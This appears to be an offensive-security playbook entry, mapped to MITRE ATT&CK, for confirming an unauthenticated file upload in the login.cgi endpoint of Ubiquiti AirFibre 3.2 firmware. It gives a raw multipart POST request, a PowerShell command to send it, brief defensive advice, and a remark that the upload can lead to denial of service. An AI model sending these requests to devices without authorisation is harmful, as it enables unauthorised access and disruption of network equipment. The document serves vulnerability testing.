---
tags:
  - unauthenticated-upload
  - file-upload
type: procedure
tools:
  - '[[tools/PowerShell]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/Upload-File-via-HTTP-POST-to-login-cgi]]'
  - '[[commands/Send-NetworkData-TCP-Function]]'
platforms:
  - Web
  - Embedded Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
id: 3352fb9f-0079-4deb-8378-9ada5a2e23cf
created_at: '2025-12-14T05:32:10.012Z'
updated_at: '2025-12-14T05:32:10.012Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-Unauthenticated-File-Upload-to-login-cgi

## Summary

This procedure tests the unauthenticated file upload feature in the /login.cgi endpoint of Ubiquiti AirFibre 3.2 firmware by sending a single multipart/form-data POST request, confirming that files are stored in /tmp/upload without requiring credentials.

## Description

The Ubiquiti AirFibre 3.2 runs on embedded Linux with a web interface vulnerable to unauthenticated uploads via the 'upload' action in login.cgi. This step verifies the vulnerability by uploading a test file (e.g., 'test.txt' filled with 'a' characters) and observing storage. It serves as the initial access point for further exploitation like DoS. Prerequisites include network access to the device's IP on port 80; no authentication is needed.

## Requirements

1. Network connectivity to target IP on port 80
2. PowerShell environment with custom Send-NetworkData function
3. Basic understanding of HTTP multipart/form-data

## Defense

Defensive measures and detection strategies:

- Implement authentication checks on all CGI endpoints
- Validate and limit file uploads (size, type, count)
- Monitor /tmp for unusual file growth and alert on disk usage >80%

## Objectives

1. Confirm unauthenticated upload capability
2. Store a test file in /tmp/upload
3. Identify potential for mass uploads

## Instructions

### Step 1: Prepare POST Request

**Context**: Construct the HTTP POST body with multipart/form-data, including file field and action=upload.

**Command** ([[commands/Upload-File-via-HTTP-POST-to-login-cgi]]):
```powershell
POST http://$ip/login.cgi HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 5278
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP

------WebKitFormBoundaryoA1KFlNlMcwhR9SP
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

aaaa
------WebKitFormBoundaryoA1KFlNlMcwhR9SP
Content-Disposition: form-data; name="action"

upload
------WebKitFormBoundaryoA1KFlNlMcwhR9SP--
```

> This command defines the raw HTTP POST. Replace $ip with target IP. Expected output: Raw POST string ready for transmission.

### Step 2: Send Request via TCP

**Context**: Use the custom function to send the POST over TCP to port 80 and read the response.

**Command** ([[commands/Send-NetworkData-TCP-Function]]):
```powershell
echo $POST | Send-NetworkData -Computer $ip -Port 80 -Encoding ASCII
```

> Pipes the POST body to Send-NetworkData. Expected output: HTTP response (e.g., 200 OK) confirming upload success; file appears in /tmp/upload.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/Upload-File-via-HTTP-POST-to-login-cgi]]
- [[commands/Send-NetworkData-TCP-Function]]

## Tools Used

- [[tools/PowerShell]]

## Tags

- [[unauthenticated-upload]]
- [[file-upload]]
